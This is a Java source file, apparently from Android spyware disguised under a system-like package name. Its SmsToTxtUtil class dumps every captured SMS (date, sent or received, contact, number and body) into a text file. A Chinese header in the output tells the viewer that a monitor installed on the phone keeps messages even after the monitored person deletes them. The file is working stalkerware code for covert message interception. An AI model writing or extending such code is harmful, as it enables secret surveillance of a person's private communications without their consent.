package com.android.system.controled.util;

import java.util.ArrayList;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.SmsInfo;
import com.android.system.controled.db.SdcardDbOpera;

public class SmsToTxtUtil {

	private static SmsToTxtUtil mInstence;

	private SmsToTxtUtil() {
		
	}

	public static SmsToTxtUtil getInstence() {
		if (mInstence == null) {
			mInstence = new SmsToTxtUtil();
		}
		return mInstence;
	}

	public synchronized void saveAllSmsToTextFile() {
		
		Debug.e("", "saveAllSmsToTextFile");
		
		SdcardDbOpera db = SdcardDbOpera.getInstence();

		ArrayList<SmsInfo> smss = db.getAllSms();
		if (MainApplication.FILE_SMS_TEXT.exists()) {
			MainApplication.FILE_SMS_TEXT.delete();
		}
		
		StringBuffer sb = new StringBuffer();
		sb.append("注意：本记录是监听器安装在手机上之后所保存的短信来往记录，即使被监听方收发短信后删除短信，监听器仍会记录下来！\r\n");
		sb.append("[按时间顺序显示]\r\n\r\n");
		if (smss != null && smss.size() > 0) {
			String dateTemp = "";
			
			for (SmsInfo sms : smss) {

				String date = TimeUtil.longToDateString(sms.getDate());

				if (!dateTemp.equals(date)) {
					dateTemp  = String.valueOf(date);
					sb.append("【 ").append(date).append("】\r\n\r\n\r\n");
				}

				if (sms.getType() == 1) {
					sb.append("【收信】\r\n");
				} else {
					sb.append("【发信】\r\n");
				}

				sb.append(TimeUtil.longToTime(sms.getDate()));

				if (sms.getName().equals(sms.getAddress())) {
					sb.append("\r\n对方：").append(sms.getName());
				} else {
					sb.append("\r\n对方：").append(sms.getName()).append(" ").append(sms.getAddress());
				}

				sb.append("\r\n内容：").append(sms.getBody()).append("\r\n\r\n");
			}
		} else {
			sb.append("暂无短信记录！");
		}
		
		FileUtil.writeFile(sb.toString(), MainApplication.FILE_SMS_TEXT, true);
	}
}
